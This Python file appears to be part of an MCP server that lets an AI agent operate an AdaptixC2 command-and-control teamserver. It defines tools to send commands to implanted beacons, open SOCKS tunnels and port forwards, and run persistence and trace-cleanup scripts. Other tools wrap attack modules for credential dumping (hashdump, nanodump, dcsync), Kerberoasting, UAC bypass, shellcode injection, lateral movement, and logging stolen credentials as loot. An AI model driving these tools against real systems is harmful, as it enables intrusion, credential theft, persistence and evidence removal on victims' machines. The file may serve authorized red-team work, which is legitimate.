    os.makedirs(PAYLOADS_DIR, exist_ok=True)
    filepath = os.path.join(PAYLOADS_DIR, f"screenshot_{screen_id}.png")
    with open(filepath, "wb") as f:
        f.write(r.content)
    return f"Screenshot saved: {filepath} ({len(r.content)} bytes)"


@server.tool()
def screenshot_set_note(screen_ids: str, note: str):
    """Set a note on screenshots. screen_ids: comma-separated screenshot IDs."""
    ids = [i.strip() for i in screen_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/screen/setnote", headers=_api_headers(), json={"screen_id_array": ids, "note": note}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Note set."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def screenshots_remove(screen_ids: str):
    """Remove screenshots. screen_ids: comma-separated screenshot IDs."""
    ids = [i.strip() for i in screen_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/screen/remove", headers=_api_headers(), json={"screen_id_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Screenshots removed."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Tunnels


@server.tool()
def tunnels_list():
    """List all active tunnels (SOCKS proxies, port forwards)."""
    r = requests.get(f"https://{endpoint}/tunnel/list", headers=_api_headers(), verify=False)
    try:
        data = r.json()
        if not data:
            return "No tunnels."
        return json.dumps(data, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tunnel_start_socks5(agent_id: str, lhost: str, lport: int, listen: bool = True, desc: str = "", use_auth: bool = False, username: str = "", password: str = ""):
    """Start a SOCKS5 tunnel through an agent."""
    r = requests.post(f"https://{endpoint}/tunnel/start/socks5", headers=_api_headers(),
        json={"agent_id": agent_id, "listen": listen, "desc": desc, "l_host": lhost, "l_port": lport,
              "use_auth": use_auth, "username": username, "password": password}, verify=False)
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"SOCKS5 tunnel started. ID: {resp.get('message', '')}"
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tunnel_start_socks4(agent_id: str, lhost: str, lport: int, listen: bool = True, desc: str = ""):
    """Start a SOCKS4 tunnel through an agent."""
    r = requests.post(f"https://{endpoint}/tunnel/start/socks4", headers=_api_headers(),
        json={"agent_id": agent_id, "listen": listen, "desc": desc, "l_host": lhost, "l_port": lport}, verify=False)
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"SOCKS4 tunnel started. ID: {resp.get('message', '')}"
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tunnel_start_lportfwd(agent_id: str, lhost: str, lport: int, target_host: str, target_port: int, listen: bool = True, desc: str = ""):
    """Start local port forwarding through an agent."""
    r = requests.post(f"https://{endpoint}/tunnel/start/lportfwd", headers=_api_headers(),
        json={"agent_id": agent_id, "listen": listen, "desc": desc, "l_host": lhost, "l_port": lport,
              "t_host": target_host, "t_port": target_port}, verify=False)
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Local port forward started. ID: {resp.get('message', '')}"
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tunnel_start_rportfwd(agent_id: str, port: int, target_host: str, target_port: int, listen: bool = True, desc: str = ""):
    """Start remote port forwarding through an agent."""
    r = requests.post(f"https://{endpoint}/tunnel/start/rportfwd", headers=_api_headers(),
        json={"agent_id": agent_id, "listen": listen, "desc": desc, "port": port,
              "t_host": target_host, "t_port": target_port}, verify=False)
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Remote port forward started. ID: {resp.get('message', '')}"
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tunnel_stop(tunnel_id: str):
    """Stop a tunnel by ID."""
    r = requests.post(f"https://{endpoint}/tunnel/stop", headers=_api_headers(), json={"p_tunnel_id": tunnel_id}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tunnel stopped."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tunnel_set_info(tunnel_id: str, info: str):
    """Set description/info on a tunnel."""
    r = requests.post(f"https://{endpoint}/tunnel/set/info", headers=_api_headers(), json={"p_tunnel_id": tunnel_id, "p_info": info}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tunnel info updated."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Tasks


@server.tool()
def tasks_list(agent_id: str, limit: int = 200, offset: int = 0):
    """List completed tasks for an agent. limit: max results (default 200, max 1000). offset: skip first N."""
    r = requests.get(f"https://{endpoint}/agent/task/list", headers=_api_headers(),
        params={"agent_id": agent_id, "limit": limit, "offset": offset}, verify=False)
    try:
        data = r.json()
        if not data:
            return "No tasks."
        return json.dumps(data, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tasks_cancel(agent_id: str, task_ids: str):
    """Cancel pending tasks. task_ids: comma-separated task IDs."""
    ids = [i.strip() for i in task_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/task/cancel", headers=_api_headers(),
        json={"agent_id": agent_id, "tasks_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tasks cancelled."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def tasks_delete(agent_id: str, task_ids: str):
    """Delete tasks from history. task_ids: comma-separated task IDs."""
    ids = [i.strip() for i in task_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/task/delete", headers=_api_headers(),
        json={"agent_id": agent_id, "tasks_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tasks deleted."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Agent Management


@server.tool()
def agent_remove(agent_ids: str):
    """Remove agent sessions. agent_ids: comma-separated agent IDs."""
    ids = [i.strip() for i in agent_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/remove", headers=_api_headers(), json={"agent_id_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Agents removed."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def agent_set_tag(agent_ids: str, tag: str):
    """Set tag on agents. agent_ids: comma-separated agent IDs."""
    ids = [i.strip() for i in agent_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/set/tag", headers=_api_headers(), json={"agent_id_array": ids, "tag": tag}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tag set."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def agent_set_mark(agent_ids: str, mark: str):
    """Set mark on agents. agent_ids: comma-separated agent IDs."""
    ids = [i.strip() for i in agent_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/set/mark", headers=_api_headers(), json={"agent_id_array": ids, "mark": mark}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Mark set."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def agent_set_color(agent_ids: str, background: str = "", foreground: str = "", reset: bool = False):
    """Set color on agents. Colors are RGB hex strings (e.g. '#ff0000'). agent_ids: comma-separated."""
    ids = [i.strip() for i in agent_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/set/color", headers=_api_headers(),
        json={"agent_id_array": ids, "bc": background, "fc": foreground, "reset": reset}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Color set."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Agent Commands


@server.tool()
def list_commands(agent_type: str = ''):
    """List available commands for agent types (beacon, gopher, etc).
    agent_type: optional filter, e.g. 'beacon' or 'gopher'. Leave empty to list all."""
    if not agent_commands:
        return 'No agent commands registered yet (server may still be syncing).'
    lines = []
    for name, groups in agent_commands.items():
        if agent_type and agent_type.lower() != name.lower():
            continue
        lines.append(f'=== {name} ===')
        for group in groups:
            cmds = group.get('commands', '')
            if cmds:
                lines.append(cmds)
    if not lines:
        return f'No commands found for agent type "{agent_type}".'
    return chr(10).join(lines)


@server.tool()
def send_command(agent_id: str, command: str):
    """Send a command to an agent session, exactly as an operator would type it in the console.
    agent_id: the agent session ID (from get_live_beacons)
    command: the full command string, e.g. 'cat /etc/passwd', 'shell id', 'ps', 'ls /tmp'
    Use list_commands to see available commands for each agent type.

    IMPORTANT - do NOT use these agent commands, use the corresponding MCP tools instead:
    - socks start/stop -> use tunnel_start_socks5 / tunnel_stop (server manages tunnel lifecycle)
    - download -> use send_command to trigger exfil, then download_sync to retrieve the file locally
    - screenshot -> use send_command to capture, then screenshot_save to retrieve the image locally"""
    return send_command_raw(agent_id, command)


@server.tool()
def script_list():
    """List the scripts available in the server-side script library.

    Scripts are shell scripts hosted by the AdaptixC2 teamserver (for example
    persist_linux, cleanup_persistence, cleanup_traces). Each entry reports the
    operating systems it supports and whether it is destructive.

    Use script_run to execute one of them against an agent."""
    r = requests.post(f"https://{endpoint}/automation/scripts/list",
        headers=_api_headers(), json={}, verify=False)
    try:
        resp = r.json()
        if not resp.get("ok"):
            return f"Failed: {resp.get('message', 'unknown error')}"
        scripts = resp.get("scripts", [])
        if not scripts:
            return "No scripts registered in the server-side script library."
        lines = []
        for s in scripts:
            os_list = ", ".join(s.get("os", []))
            flag = " [DESTRUCTIVE]" if s.get("destructive") else ""
            lines.append(
                f"{s.get('id')}{flag}\n"
                f"  name: {s.get('name')}\n"
                f"  os: {os_list}\n"
                f"  args: {', '.join(a.get('name', '') for a in s.get('args', []))}\n"
                f"  {s.get('description', '')}"
            )
        return chr(10).join(lines)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def script_run(agent_id: str, script_id: str, args: str = ""):
    """Run a script from the server-side script library against an agent.

    agent_id: the agent session ID (from get_live_beacons)
    script_id: the script id, e.g. persist_linux, cleanup_persistence, cleanup_traces
    args: optional arguments for the script, space separated, e.g. '--method list'

    The script body is uploaded to the agent and started there, so the target
    must be a Linux/macOS agent. Scripts marked destructive (cleanup_persistence,
    cleanup_traces) remove artifacts on the target and should be used with care."""
    arg_list = [a for a in args.split(" ") if a] if args else []

    r = requests.post(f"https://{endpoint}/automation/scripts/run",
        headers=_api_headers(),
        json={"agent_id": agent_id, "script_id": script_id, "args": arg_list},
        verify=False)
    try:
        resp = r.json()
        if not resp.get("ok"):
            return f"Failed: {resp.get('message', 'unknown error')}"
        return f"Script '{script_id}' started on agent {agent_id}."
    except Exception as e:
        return f"Error: {e}"


######################### Windows / BOF tools
# Merged from AdaptixC2-MCP-Server (Faceless0x7) and adapted to this server's
# raw/structured command plumbing. The BOF command names themselves come from
# the Extension-Kit axscripts loaded on the teamserver.


def _require_windows(agent_id: str):
    info = live_agents.get(agent_id) or {}
    if info.get("os") != 1:
        return (f"Error: agent '{agent_id}' is not a Windows beacon "
                f"(os={info.get('os', 'unknown')}). BOF/filesystem/exec tools only work on "
                "beacon agents; use send_command for gopher/Linux agents.")
    return None


def _bof(agent_id: str, command: str, args: str = ""):
    if not command:
        return "Error: command is required, e.g. 'hashdump' or 'certi enum'."
    return send_command_raw(agent_id, f"{command} {args}".strip())


def _fs(agent_id: str, cmdline: str, args: dict):
    err = _require_windows(agent_id)
    if err:
        return err
    return send_command_execute(agent_id, cmdline, args)


@server.tool()
def bof_ad(agent_id: str, command: str, args: str = ""):
    """AD-BOF (Windows beacon + Extension-Kit): adwssearch <query>; badtakeover <ou> <account> <sid> <dn> <domain>; dcsync single <target> | dcsync all; ldapsearch <query>; ldapq computers; readlaps -target <name>; webdav enable|status <hosts>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_adcs(agent_id: str, command: str, args: str = ""):
    """ADCS-BOF: certi auth --cert <pfx_b64> [--password p]; certi enum [--ca c] [--template t]; certi request --ca <ca> --template <t>; certi request_on_behalf <ca> <tmpl> <user> <pfx>; certi shadow --target <user>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_creds(agent_id: str, command: str, args: str = ""):
    """Creds-BOF: askcreds; get-netntlm [--no-ess]; hashdump; lsadump_secrets; lsadump_sam; lsadump_cache; nanodump [--write path] [--ppl-dump|--kdump]; nanodump_ppl_dump; nanodump_ppl_medic; nanodump_ssp; cookie-monster; underlaycopy <MFT|Metadata> <src> [-w dst]."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_elevation(agent_id: str, command: str, args: str = ""):
    """Elevation-BOF: getsystem token; uacbybass sspi|regshellcmd <path>; potato-dcom --token|--run <cmd>; potato-print --token|--run <cmd>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_execution(agent_id: str, command: str, args: str = ""):
    """Execution-BOF: execute-assembly <path> [params]; noconsolation <path> [args]."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_injection(agent_id: str, command: str, args: str = ""):
    """Injection-BOF: inject-cfg <pid> <shellcode>; inject-sec <pid> <shellcode>; inject-poolparty <1-8> <pid> <shellcode>; inject-32to64 <pid> <shellcode>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_kerbeus(agent_id: str, command: str, args: str = ""):
    """Kerbeus-BOF: kerbeus asreproasting | asktgt | asktgs | changepw | dump | hash | kerberoasting | klist | ptt | describe | purge | renew | s4u | cross_s4u | tgtdeleg | triage — Kerberos ticket operations; append /help for per-subcommand args."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_ldap(agent_id: str, command: str, args: str = ""):
    """LDAP-BOF: full AD read/write/delete. get-{acl,attribute,computers,groups,groupmembers,delegation,domaininfo,maq,object,rbcd,spn,uac,users,usergroups,writable}; add-{ace,attribute,computer,delegation,group,groupmember,ou,rbcd,sidhistory,spn,user,uac,genericall,genericwrite,dcsync,asreproastable,unconstrained,constrained}; set-{attribute,delegation,owner,spn,password,uac}; remove-{ace,attribute,delegation,dcsync,genericall,genericwrite,groupmember,object,rbcd,spn,uac}. Prefix every command with 'ldap '."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_lateral(agent_id: str, command: str, args: str = ""):
    """LateralMovement: jump psexec|scshell <target> <payload>; invoke winrm <target> <cmd>; invoke scshell <target> <service> <cmd>; token make <user> <pass> <domain> <logon_type>; token steal <pid>; runas-user <user> <pass> <domain> <cmd>; runas-session <session_id> <file>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_mssql(agent_id: str, command: str, args: str = ""):
    """MSSQL-BOF: mssql info|whoami|databases|tables|columns|rows|query|users|links|impersonate|agentcmd|agentstatus|xpcmd|olecmd|clr|smb|1434udp|checkrpc|search|enable*/disable* <server> — SQL Server enum and exploitation."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_postex(agent_id: str, command: str, args: str = ""):
    """PostEx-BOF: firewallrule add <port> <name> <direction>; screenshot_bof [-n name] [-p pid]; sauroneye -d <dir> -f <exts> -k <keywords>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_process(agent_id: str, command: str, args: str = ""):
    """Process-BOF: findobj module <module>; findobj prochandle <proc>; process conn; procfreeze freeze <pid>; procfreeze unfreeze."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_relayinformer(agent_id: str, command: str, args: str = ""):
    """RelayInformer-BOF: relay-informer http|ldap|mssql|smb <target> — check relay mitigations (signing, channel binding)."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_sal(agent_id: str, command: str, args: str = ""):
    """SAL-BOF (local recon): arp; cacls <path>; dir [path] [/s]; env; ipconfig; listdns; netstat; nslookup <domain>; routeprint; uptime; useridletime; whoami; privcheck all|alwayselevated|autologon|credmanager|hijackablepath|modautorun|modsvc|pshistory|tokenpriv|uacstatus|unattendfiles|unquotedsvc|vulndrivers."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_sar(agent_id: str, command: str, args: str = ""):
    """SAR-BOF (remote recon): smartscan <target> [-p fast|standart|full|ports]; taskhound <target>; quser [host]; nbtscan <target>."""
    err = _require_windows(agent_id)
    if err:
        return err
    return _bof(agent_id, command, args)


@server.tool()
def bof_check(agent_id: str):
    """Check whether Extension-Kit BOF commands are available for this Windows beacon."""
    err = _require_windows(agent_id)
    if err:
        return err
    name = (live_agents.get(agent_id) or {}).get("name", "")
    groups = agent_commands.get(name, [])
    flat = " ".join(g.get("commands", "") if isinstance(g, dict) else str(g) for g in groups)
    probes = ["adwssearch", "hashdump", "kerbeus", "mssql", "smartscan", "privcheck"]
    found = [p for p in probes if p in flat]
    if not found:
        return ("Extension-Kit BOF commands not detected for agent type "
                f"'{name}'. Load Extension-Kit/extension-kit.axs in the teamserver profile, "
                "then call bof_check again.")
    return f"Extension-Kit detected ({len(found)}/{len(probes)} probes): {', '.join(found)}"


######################### Windows filesystem tools


@server.tool()
def list_directory(agent_id: str, path: str = "."):
    """List contents of a directory or details of a file on a Windows beacon. Usage: ls [path]."""
    return _fs(agent_id, f"ls {path}", {"command": "ls", "path": path, "message": "Task: list files"})


@server.tool()
def get_working_directory(agent_id: str):
    """Print the current working directory of the agent process."""
    return _fs(agent_id, "pwd", {"command": "pwd", "message": "Task: print working directory"})


@server.tool()
def read_file(agent_id: str, path: str):
    """Read the first 2048 bytes of a file on the agent. Usage: cat <path>."""
    if not path:
        return "Error: path is required."
    return _fs(agent_id, f"cat {path}", {"command": "cat", "path": path, "message": "Task: read file"})


@server.tool()
def change_directory(agent_id: str, path: str):
    """Change the agent's working directory. Usage: cd <path>."""
    if not path:
        return "Error: path is required."
    return _fs(agent_id, f"cd {path}", {"command": "cd", "path": path, "message": "Task: change working directory"})


@server.tool()
def copy_file(agent_id: str, src: str, dst: str):
    """Copy a file on the agent. Usage: cp <src> <dst>."""
    if not src or not dst:
        return "Error: src and dst are required."
    return _fs(agent_id, f"cp {src} {dst}", {"command": "cp", "src": src, "dst": dst, "message": "Task: copy file"})


@server.tool()
def move_file(agent_id: str, src: str, dst: str):
    """Move/rename a file on the agent. Usage: mv <src> <dst>."""
    if not src or not dst:
        return "Error: src and dst are required."
    return _fs(agent_id, f"mv {src} {dst}", {"command": "mv", "src": src, "dst": dst, "message": "Task: move file"})


@server.tool()
def make_directory(agent_id: str, path: str):
    """Create a directory on the agent. Usage: mkdir <path>."""
    if not path:
        return "Error: path is required."
    return _fs(agent_id, f"mkdir {path}", {"command": "mkdir", "path": path, "message": "Task: make directory"})


@server.tool()
def remove_file(agent_id: str, path: str):
    """Remove a file or directory on the agent. Usage: rm <path>."""
    if not path:
        return "Error: path is required."
    return _fs(agent_id, f"rm {path}", {"command": "rm", "path": path, "message": "Task: remove file or directory"})


@server.tool()
def download_file(agent_id: str, remote_path: str):
    """Task the agent to send a file to the teamserver. Usage: download <file>. Retrieve it with download_sync."""
    if not remote_path:
        return "Error: remote_path is required."
    return _fs(agent_id, f"download {remote_path}", {"command": "download", "file": remote_path, "message": "Task: download file"})


@server.tool()
def list_disks(agent_id: str):
    """List mounted drives on the agent. Usage: disks."""
    return _fs(agent_id, "disks", {"command": "disks", "message": "Task: show mounted disks"})


######################### Windows execution tools


@server.tool()
def execute_powershell(agent_id: str, command: str):
    """Execute a PowerShell expression (Windows only). Example: 'Get-LocalUser | Select Name,Enabled'."""
    err = _require_windows(agent_id)
    if err:
        return err
    if not command:
        return "Error: command is required."
    return send_command_execute(agent_id, f"powershell {command}",
                                {"command": "powershell", "cmd_params": command})


@server.tool()
def set_agent_sleep(agent_id: str, sleep_seconds: int, jitter_percent: int = 0):
    """Change the agent's sleep interval (seconds) and jitter (percent)."""
    return send_command_execute(agent_id, f"sleep {sleep_seconds} {jitter_percent}",
                                {"command": "sleep", "sleep": str(sleep_seconds),
                                 "jitter": jitter_percent})


@server.tool()
def jobs_list(agent_id: str):
    """List long-running background jobs on a Windows beacon."""
    err = _require_windows(agent_id)
    if err:
        return err
    return send_command_execute(agent_id, "jobs list", {"command": "jobs", "subcommand": "list"})


@server.tool()
def jobs_kill(agent_id: str, task_id: str):
    """Kill a background job by task ID (from jobs_list)."""
    err = _require_windows(agent_id)
    if err:
        return err
    if not task_id:
        return "Error: task_id is required."
    return send_command_execute(agent_id, f"jobs kill {task_id}",
                                {"command": "jobs", "subcommand": "kill", "task_id": task_id})


######################### Reporting tools


def _notes_path(agent_id: str = ""):
    notes_dir = os.environ.get("ADAPTIX_NOTES_DIR", os.path.expanduser("~/.adaptix-mcp/notes"))
    os.makedirs(notes_dir, exist_ok=True)
    return os.path.join(notes_dir, f"{time.strftime('%Y-%m-%d')}-{agent_id or 'session'}.md")


@server.tool()
def log_finding(agent_id: str, category: str, content: str, context: str = ""):
    """Log a finding (credential, secret, loot file) to local session notes on the MCP host."""
    path = _notes_path(agent_id)
    entry = (f"\n## Finding: {category}\n"
             f"- time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"- agent: {agent_id}\n"
             f"- content: {content}\n"
             f"- context: {context}\n")
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(entry)
    return f"Finding logged to {path}."


@server.tool()
def save_writeup(agent_id: str, title: str, writeup: str):
    """Save a short writeup of a successful technique to local session notes."""
    path = _notes_path(agent_id)
    entry = (f"\n## Writeup: {title}\n"
             f"- time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"- agent: {agent_id}\n\n{writeup}\n")
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(entry)
    return f"Writeup '{title}' saved to {path}."


@server.tool()
def view_session_notes(agent_id: str = ""):
    """Read today's session notes (all agents, or a specific agent_id)."""
    if agent_id:
        paths = [_notes_path(agent_id)]
    else:
        notes_dir = os.environ.get("ADAPTIX_NOTES_DIR", os.path.expanduser("~/.adaptix-mcp/notes"))
        if not os.path.isdir(notes_dir):
            return "(no session notes yet)"
        prefix = time.strftime("%Y-%m-%d")
        paths = sorted(os.path.join(notes_dir, n) for n in os.listdir(notes_dir)
                       if n.startswith(prefix))
    chunks = []
    for path in paths:
        if os.path.isfile(path):
            with open(path, encoding="utf-8") as fh:
                chunks.append(f"=== {path} ===\n{fh.read()}")
    return "\n\n".join(chunks) if chunks else "(no session notes yet)"


if __name__ == "__main__":
    if not _connect_with_failover():
        print("FATAL: could not establish an operator session (all slots rejected by the teamserver)",
              file=sys.stderr)
        raise SystemExit(1)
    ws_thread = threading.Thread(target=start_websocket_client)
    ws_thread.start()
    server.run(transport="stdio")
